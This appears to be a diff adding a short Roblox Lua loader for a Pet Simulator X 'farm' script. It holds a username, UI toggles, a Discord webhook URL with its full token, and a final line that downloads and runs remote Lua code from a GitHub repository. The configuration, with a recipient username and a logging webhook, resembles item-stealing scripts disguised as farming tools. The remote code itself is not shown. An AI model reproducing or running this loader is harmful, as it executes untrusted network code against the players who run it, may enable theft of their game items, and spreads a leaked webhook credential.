@@ -1,0 +1,6 @@
+Username = "x1200HP"
+loadingscreen = true 
+delay = 0 
+farmui = true
+webhook = "https://discord.com/api/webhooks/1238237010167074826/ylJT44Zd9AzcgP0p0x-oK3TWzsMslK4WcvHIE30ZHQOrqqcy7P2kdIzkxRIWyxB7iAgo"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
